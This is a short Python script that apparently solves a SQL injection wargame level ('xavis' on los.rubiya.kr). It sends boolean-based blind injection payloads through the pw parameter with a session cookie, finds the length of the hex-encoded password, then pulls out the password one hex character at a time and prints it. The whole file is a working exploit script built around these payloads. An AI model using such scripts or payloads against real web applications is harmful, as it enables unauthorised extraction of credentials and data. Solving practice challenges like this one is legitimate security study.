import requests

url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?'
cookie = {"PHPSESSID" : 'ovbfdu14h0vaeamskdlr10nttu'}


for i in range(100):
    param = {'pw' : f"'||length(hex(pw))={i}-- -"}
    res = requests.get(url, params=param, cookies=cookie)
    if 'Hello admin' in res.text:
        length = i
        print(i)
        break

length = 24
password = ''
for len in range(1,length+1):
    for pw in range(0, 16):
        query = {'pw' : f"' or substr(hex(pw), {str(len)}, 1)='{format(pw, 'x')}'-- -"}
        res = requests.get(url, params = query, cookies = cookie)
        if 'Hello admin' in res.text:
            password += format(pw,'x')
            print(f"{len} : {format(pw,'x')}")
            break
print(password)

print('\x00\x00\xc6\xb0\x00\x00\xc6\x55\x00\x00\xad\x73')